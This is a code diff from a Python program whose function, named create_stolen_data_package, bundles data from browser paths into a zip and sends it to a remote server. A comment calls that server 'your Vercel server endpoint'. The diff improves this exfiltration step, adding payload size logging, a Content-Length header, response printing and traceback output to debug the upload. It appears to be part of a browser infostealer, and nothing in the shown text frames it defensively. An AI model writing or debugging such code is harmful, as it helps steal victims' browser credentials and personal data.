@@ -255,14 +255,20 @@ def create_stolen_data_package(browser_paths, server_url):
     # Send to server
     try:
         buffer.seek(0)
+        payload = buffer.read()
+        print(f"Sending {len(payload)} bytes to {server_url}")
         req = urllib.request.Request(
             server_url,
-            data=buffer.read(),
-            headers={'Content-Type': 'application/zip'}
+            data=payload,
+            headers={'Content-Type': 'application/zip', 'Content-Length': str(len(payload))}
         )
-        urllib.request.urlopen(req, timeout=10)
+        response = urllib.request.urlopen(req, timeout=10)
+        response_data = response.read().decode('utf-8')
+        print(f"Server response: {response.status} - {response_data}")
     except Exception as e:
         print(f"Failed to send data: {e}")
+        import traceback
+        traceback.print_exc()
 
 def main():
     # Your Vercel server endpoint
